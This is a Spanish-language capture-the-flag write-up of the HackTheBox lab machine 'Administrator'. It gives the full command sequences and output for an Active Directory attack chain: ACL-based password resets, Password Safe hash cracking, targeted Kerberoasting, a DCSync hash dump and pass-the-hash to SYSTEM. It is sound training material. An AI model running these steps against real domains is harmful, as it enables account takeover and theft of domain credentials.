---
title: Administrator - Medium (HTB)
permalink: /Administrator-HTB-Writeup/
tags:
  - "Windows"
  - "Medium"
  - "ACL Rights"
  - "BloodHound"
  - "GenericAll"
  - "ForceChangePassword"
  - "Hash Cracking"
  - "Password Safe"
  - "Targeted Kerberoasting"
  - "DC Sync"
  - "PassTheHash"
categories:
  - writeup
  - hacking
  - hackthebox
  - "active directory"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
seo_tittle: Administrator - Medium (HTB)
seo_description: Practica enumeración y explotación de permisos mal configurados en un entorno de Active Directory para vencer a Administrator.
excerpt: Practica enumeración y explotación de permisos mal configurados en un entorno de Active Directory para vencer a Administrator.
header:
  overlay_image: /assets/images/headers/administrator-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/administrator-hackthebox.jpg
---


![image-center](/assets/images/posts/administrator-hackthebox.png)
{: .align-center}

**Habilidades:** RPC Enumeration, DC Enumeration - BloodHound + `bloodhound-python`, Abusing ACL - `GenericAll` Rights, Abusing ACL - `ForceChangePassword` Rights, Hash Cracking - `pwsafe2john` + `john`, `.psafe3` File Analysis,  Targeted Kerberoasting - `targetedKerberosast.py`, DC Sync Attack - `secretsdump.py` [Privilege Escalation], PassTheHash
{: .notice--primary}

# Introducción

Administrator es una máquina `Medium` en HackTheBox que simula un entorno de Active Directory. En este escenario debemos analizar un archivo `.psafe3`, utilizar técnicas de explotación de permisos mal configurados para movernos lateralmente entre múltiples usuarios, además de el uso de la técnica DCSync para ganar acceso privilegiado al dominio.
<br>

En este escenario nos otorgan unas credenciales de acceso, `Olivia`:`ichliebedich`, nos serán útiles más tarde en futuros ataques

# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentra activa

~~~ bash
ping -c 1 10.10.11.42                                     
PING 10.10.11.42 (10.10.11.42) 56(84) bytes of data.
64 bytes from 10.10.11.42: icmp_seq=1 ttl=127 time=156 ms

--- 10.10.11.42 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 156.345/156.345/156.345/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos el reconocimiento con un escaneo de puertos con el fin de identificar todos los puertos que puedan estar abiertos en la máquina víctima

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.42 -oG openPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-16 16:26 EDT
Nmap scan report for 10.10.11.42
Host is up (0.37s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
54814/tcp open  unknown
54819/tcp open  unknown
54826/tcp open  unknown
54839/tcp open  unknown
54871/tcp open  unknown
59924/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 21.68 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grep`
- `-v`: Mostrar la información en tiempo real

El segundo escaneo será con el propósito de identificar la versión y los servicios para los puertos abiertos que descubrimos

~~~ bash
nmap -sVC -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,54814,54819,54826,54839,54871,59924 10.10.11.42 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-16 16:44 EDT
Nmap scan report for 10.10.11.42
Host is up (0.29s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-17 03:44:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
54814/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
54819/tcp open  msrpc         Microsoft Windows RPC
54826/tcp open  msrpc         Microsoft Windows RPC
54839/tcp open  msrpc         Microsoft Windows RPC
54871/tcp open  msrpc         Microsoft Windows RPC
59924/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-17T03:45:31
|_  start_date: N/A
|_clock-skew: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.23 seconds
~~~

- `-p`: Especificar los puertos
- `-sV`: Identificar la versión del servicio que se ejecuta
- `-sC`: uso de scripts de reconocimiento
- `-oN`: Exportar en formato normal

Logramos ver muchos servicios expuestos, como DNS, FTP, Kerberos, LDAP, SMB, entre otros. Además podemos ver que se trata de un Windows Server 2022 y que el dominio tiene como nombre `administrator.htb` y el nombre del Controlador de Dominio que es `DC`

Agregaremos el dominio y el nombre del DC al archivo `/etc/hosts` para poder hacer referencia a él en futuros ataques

~~~ bash
cat /etc/hosts | grep administrator.htb 

10.10.11.42 administrator.htb DC.administrator.htb
~~~


## (Posible) FTP Connection as `olivia`

Como elpuerto `21` se encuentra habilitado, podemos intentar abrir una sesión en este servicio, primeramente intentamos sin credenciales, y posteriormente usando las credenciales que nos han brindado. No podremos acceder a este servicio

~~~ bash
ftp 10.10.11.42
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:incommatose): anonymous 
331 Password required
Password: 
530 User cannot log in.
ftp: Login failed

# Intentamos con el usuario que nos han brindado
ftp> user olivia
331 Password required
Password: 
530 User cannot log in, home directory inaccessible.
Login failed.
ftp> 
~~~


## (Posible) SMB Enumeration

Enumeraremos el servicio `smb` para listar los recursos de red un busca de información interesante usando una sesión anónima, sin embargo necesitaremos credenciales de acceso

~~~ bash
smbclient -L 10.10.11.42 -U "" -N        

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.42 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

smbclient -L 10.10.11.42 -U "guest" -N 
session setup failed: NT_STATUS_LOGON_FAILURE
~~~

Si usamos las credenciales proporcionadas, vemos que podremos listar los recursos. Luego de una investigación nos daremos cuenta que no hay nada relevante para la explotación

~~~ bash
smbclient -L //10.10.11.42/ -U 'olivia%ichliebedich'   

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share
~~~


## RPC Enumeration

Podemos intentar enumerar información del dominio a través del protocolo RPC, primero intentamos sin credenciales

~~~ bash
rpcclient 10.10.11.42 -U "" -N -c 'enumdomusers'
result was NT_STATUS_ACCESS_DENIED
~~~

El servidor no permite sesiones anónimas, utilizaremos las credenciales que nos han proporcionado

~~~ bash
rpcclient -U "Olivia%ichliebedich" 10.10.11.42 -c enumdomusers

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[olivia] rid:[0x454]
user:[michael] rid:[0x455]
user:[benjamin] rid:[0x456]
user:[emily] rid:[0x458]
user:[ethan] rid:[0x459]
user:[alexander] rid:[0xe11]
user:[emma] rid:[0xe12]
~~~

Crearemos una lista de los usuarios que hemos encontrado con el siguiente comando

~~~ bash
rpcclient -U "Olivia%ichliebedich" 10.10.11.42 -c enumdomusers | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]' > users.txt
~~~


## Domain Analysis - BloodHound

Recolectaremos información del dominio para analizar vías potenciales mediante las cuales elevar nuestros privilegios

~~~ bash
bloodhound-python -d administrator.htb -c All -ns 10.10.11.42 --zip -u 'Olivia' -p 'ichliebedich' -op administrator 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 32S
INFO: Compressing output into 20250417005459_bloodhound.zip
~~~
<br>

 
# Intrusión / Explotación
---
## Abusing ACL - `GenericAll` Rights

Si consultamos BloodHound en las propiedades del usuario > `Outbound Object Control`, podemos notar que el usuario `olivia` posee derechos `GenericAll` sobre la cuenta `michael`, esto nos otorga control total sobre este usuario

![image-center](/assets/images/posts/administrator-bloodhound-1.png){: align-center}

Tenemos la capacidad de cambiarle la contraseña al usuario `michael`, en este escenario aplicaremos este método, sin embargo en entornos reales no es lo más recomendable ya que puedes tumbar servicios si lo usas frente a una cuenta de servicio.

### Forcing Password Change - `michael`

En este caso, la cuenta `olivia` puede obtener una shell remota a través de `wirnm`, esto porque es miembro del grupo `Remote Management Users`. Nos conectaremos con `evil-winrm` y llevaremos a cabo este ataque mediante `powershell` para hacerlo de una forma más manual, aunque podamos hacerlo a través de la herramienta `net`

~~~ bash
evil-winrm -i 10.10.11.42 -u 'Olivia' -p 'ichliebedich'
                                        
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\olivia\Documents> 
~~~

Necesitaremos usar el módulo de `PowerView`, por lo que lo descargaremos en la máquina atacante y lo transferiremos a la máquina víctima

~~~ bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1

*Evil-WinRM* PS C:\Users\olivia\Documents> upload PowerView.ps1
Info: Upload successful!

*Evil-WinRM* PS C:\Users\olivia\Documents> Import-Module .\PowerView.ps1
~~~

Ahora crearemos un `SecureString` con la contraseña que queremos asignarle al usuario `michael` y aplicaremos el cambio de contraseña

~~~ powershell
$SecPassword = ConvertTo-SecureString 'Password123$' -AsPlainText -Force
Set-DomainUserPassword -Identity michael -AccountPassword $SecPassword
~~~

Validaremos que la contraseña se haya cambiado correctamente con `netexec`, además verificaremos que este usuario pueda conectarse al dominio con una consola remota

~~~ bash
nxc winrm 10.10.11.42 -u 'michael' -p 'Password123$'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\michael:Password123$ (Pwn3d!) 
~~~

El mensaje es `pwned`, esto pasa porque el usuario `michael` es parte del grupo `Remote Management Users`, que es un grupo especial que le permite a los usuarios miembros conectarse remotamente

### Shell as `michael`

Con la contraseña cambiada para el usuario `michael`, tenemos la capacidad de autenticarnos en el protocolo `winrm` y obtener una consola de `powershell`

~~~ bash
evil-winrm -i 10.10.11.42 -u 'michael' -p 'Password123$' 
                                        
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\michael\Documents> whoami 
administrator\michael
~~~


## Abusing ACL - `ForceChangePassword` Rights

Si exploramos los objetos que usuario `michael` puede controlar, notaremos que posee el derecho `ForceChangePassword`. Como su nombre nos indica, nos otorga la capacidad de cambiar la contraseña de un usuario sin necesidad de conocer la actual

![image-center](/assets/images/posts/administrator-bloodhound-2.png){: align-center}

Para realizar este ataque, usaremos el método que emplea la herramienta `net` para cambiar la contraseña del usuario `benjamin`

~~~ bash
net rpc password benjamin 'Password123!' -U 'administrator.htb/michael%Password123$' -S DC.administrator.htb 
~~~

Validaremos que se haya cambiado con `netexec`

~~~ bash
nxc smb 10.10.11.42 -u 'benjamin' -p 'Password123!'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\benjamin:Password123!
~~~

### FTP Connection as `benjamin`

Si nos conectamos por `ftp` a la máquina víctima utilizando el usuario `benjamin`, podremos ver el siguiente recurso

~~~ bash
ftp 10.10.11.42 
Connected to 10.10.11.42.
220 Microsoft FTP Service
Name (10.10.11.42:incommatose): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||51001|)
125 Data connection already open; Transfer starting.

10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
~~~

Vemos un archivo `Backup.psafe3`, estos archivos son bases de datos de contraseñas encriptadas y se utilizan en la aplicación `Password Safe`.Traeremos este archivo a nuestra máquina

~~~
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||51003|)
125 Data connection already open; Transfer starting.
100% |*******************************************************************************************************************************************|   952        5.56 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (5.55 KiB/s)
~~~


## Hash Cracking - `.psafe3` File

Intentaremos desencriptar este archivo, para ello necesitamos hacer un tratamiento del mismo con la herramienta `pwsafe2john`, de esta forma podremos intentar crackear la contraseña maestra que descifra el archivo

~~~ bash
pwsafe2john Backup.psafe3
Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
~~~

Guardamos el hash en un archivo `hash.txt` para intentar crackearlo con `john`

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-04-18 09:37) 1.960g/s 16062p/s 16062c/s 16062C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~

Y la herramienta ha encontrado la contraseña `tekieromucho`, ésta nos servirá para abrir el archivo `.psafe3`


## `.psafe3` File Analysis

Descargaremos `Password Safe` para Linux o Windows, podemos hacerlo desde su sitio oficial para Windows o desde su repositorio oficial en `Github`

- https://github.com/pwsafe/pwsafe/releases

Abriremos el archivo con el comando `pwsafe`, en el campo `Master Password` pondremos la contraseña que acabamos de crackear

![image-center](/assets/images/posts/administrator-pwsafe-file-analysis.png)
{: align-center}

Se nos abrirá la siguiente interfaz donde podemos ver un grupo de usuarios pertenecientes al dominio

![image-center](/assets/images/posts/administrator-pwsafe-file-analysis-2.png){: align-center}

Haremos clic derecho > `View Entry` para ver su información, o bien podemos con clic derecho seleccionar `Copy Password to Clipboard` para copiar la contraseña

![image-center](/assets/images/posts/administrator-pwsafe-file-analysis-3.png){: align-center}

Validaremos estas credenciales a través de la herramienta `netexec`

~~~ bash
nxc smb 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' 
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
~~~

En este punto nos podremos conectar a través de `evil-winrm` y así obtener la flag del usuario no privilegiado

~~~ bash
evil-winrm -i 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

*Evil-WinRM* PS C:\Users\emily\Documents> type ..\Desktop\user.txt
234e17381dd71ce4572bbaee2846c230
~~~
<br>


# Escalada de privilegios
---
## Targeted Kerberoasting

Podemos ver que el usuario `emily` cuenta con derechos `GenericWrite` sobre la cuenta de `ethan`, este permiso nos permite modificar los atributos de este usuario

![image-center](/assets/images/posts/administrator-bloodhound-3.png){: align-center}

Para un Kerberoasting sabemos que necesitamos que existan cuentas con un SPN asociado. En el caso de `Targeted Kerberoasting`, tendremos que tener derechos para modificar propiedades de una cuenta, en este caso contamos con el derecho `GenericWrite` sobre el usuario `ethan`.

Es por esto que aprovecharemos este derecho para asignar un SPN a `ethan`, lo que lo hace vulnerable a `Kerberoast`, entonces podremos obtener un TGS e intentar crackearlo de forma offline con herramientas como `john` o `hashcat`

~~~ bash
targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -f john
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
ethan:$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$e5aafa7ae883225a42f3aa2c00cc4f56$76568db7239dca9b18c88110b7b5d68ccd2a2bf88c14c9ef34ec262cd8f8c0df2165afa3c854219a1273029c947c016e9d5255b2a275edcf269c43154ce268aa27e8ae5a0a204c1d7c6bd86714d8e2d5441bb565faf35340f9dc9c0a191589b7422318a2ac61d4b93a7fa85353043420de5e5eae7d339e3d498af02ca9870e36e1a6f3a40a9891248bad0719d62bc0ab18c969b518c3ee7628b5ed4e26e92a9c31d44620097168d42a50a5755ca16ae3cc3d6ae81950018916d853124d6848b9fe5fc8523027128c28ced6148e89f029a247d0e6168e0023be4345a1967df09bbc9a6a34ab92075342436171b2d38665f8ad7d54d18398391fa2911a61c3e3473d87a8da636e60fc1b57c51265880a5fb5f5b523fc9c94cc9b237e54c4f2aa79e48ed5b9430d1a3213114dcdbfdf294a99f83a9f61b671c9a8ea7636967f65071f2e3facade9989f5dccc7ad2594eca37cda71d9d58019f25729939d0560816c40a9162509d916b7fdccfa0de470190bdae2eb466147825b3b08f698fbcb7f51f508f48ef1a775e310ed4709edfbafe935425f390d9df71d9b5370aff5566d1b417c7cb9b703cf7005e120a6adfe5c5905cc1afc2380e33f980091e3903a0ed70f5b7e20e908e12ad56d599c3199fe09590c22f0f5dd38498f6ca43ec83fbc40bbf3f526d0f521c3b03f731e0ae2900715c1b5a31dbe202c7ce68abe8288c3cb255bf158bb52d7245d6759705ff53b1aec7707e9b991850e851624671782cbb12f330c821b06e932538677bf6197e9fdce5f327dab5f03c957a2f9d49101df03ef83743b8c8c85b4bbaa51443ff179f4e4cbeeddb9883d534a9390d2fc2ff42080be21f996c273eb3b11280666d819110d758eae31d419b9cd0d8f02a59ed4dbc31ad68e9e96f0b6b56eb19b4ce7090fc1bbcbae39c629a2f28318f20323d7c8ece7f7d9d2f9c84995931980f1938a3284d38f1f27c0227a7300c0a5169e6e0a2179ca041781a2088edcc93bb99bb791ae0424d49843d5e93d9917cbadd801a1420b09c2427d041432a8f5bb4f21ba11e4a71c55ba278a93bc839ec2196fbde8e9f2a608e4651bf8ab9c82d3e2c57b922d22055176ad6daf8f1f9a1e6cb478d00641d75abbb70cf23640bbb5f5f868bc9f42010cca511344700069a9af452c4431d0572af366a46901e1df8a625eb5059e3957f4ae632e9648e2433b2b6341106a7bb414f93e6dc6e33fbee455c261f8a68ead1c847f56d93de61d6fd7130a65fec9abbb21a4cc88a5dba43c709f400dcd1cd973933a12fa59fbdc9d5a74d638292dd7f56786fab47bd65ecdc4896f592f8cb11942812ce2be60b387bbe75439a792d5bfd5aa8282a2481d49d3aa67d0e573ac56525bde2a5254dec910b36543f08b3805de4f2ef69d28caf5b189a3aa61ef23e2c6a61823fefa7b9d2be5d2335fb6104721b42826d304c9af5bff4535d0f4ad8991482f37ff93aa787e1d20504c74dc5991ace59d1886f2642b246f15d37f0c819dd94fb6e63f9e0e3670a7
[VERBOSE] SPN removed successfully for (ethan)
~~~

Guardaremos el hash en un archivo e intentaremos descifrarlo con `john`

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
limpbizkit       (ethan)     
1g 0:00:00:00 DONE (2025-04-18 18:00) 50.00g/s 256000p/s 256000c/s 256000C/s newzealand..babygrl
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~ 

Y encontramos la contraseña `limpbizkit` para la cuenta `ethan`, validaremos esta credencial utilizando `netexec`

~~~ bash
nxc smb 10.10.11.42 -u 'ethan' -p 'limpbizkit'              
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\ethan:limpbizkit
~~~


## DC Sync Attack

El usuario `ethan` posee los derechos `GetChanges` y `GetChangesAll` sobre el dominio, esto nos permite obtener el hash `NT` de un usuario privilegiado con herramientas como `secretsdump`

![image-center](/assets/images/posts/administrator-bloodhound-4.png){: align-center}

DCSync es un ataque donde como atacantes simulamos ser un Controlador de Dominio y solicitamos al DC una replicación de datos. En este caso, solicitaremos el NTDS para ver los hashes `NT` de los usuarios del dominio. Llevaremos a cabo el ataque empleando el siguiente comando

~~~ bash
secretsdump.py administrator.htb/ethan:limpbizkit@dc.administrator.htb      
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
~~~


## PassTheHash - Root Time

Como disponemos del hash del usuario Administrador, podemos hacer PassTheHash con `psexec` para conectarnos con privilegios elevados

~~~ bash
psexec.py administrator.htb/Administrator@10.10.11.42 -hashes :3dc553ce4b9fd20bd016e098d2d2fd2e 

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.11.42.....
[*] Found writable share ADMIN$
[*] Uploading file jlXVlqOl.exe
[*] Opening SVCManager on 10.10.11.42.....
[*] Creating service ooJx on 10.10.11.42.....
[*] Starting service ooJx.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2762]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
~~~

Espero este artículo te haya ayudado a aprender más sobre enumeración y explotación en entornos de Active Directory. Por último, te dejo la frase del día para reflexionar, muchas gracias por leer.

> Happiness is found in doing, not merely possessing.
> — Napoleon Hill
{: .notice--info}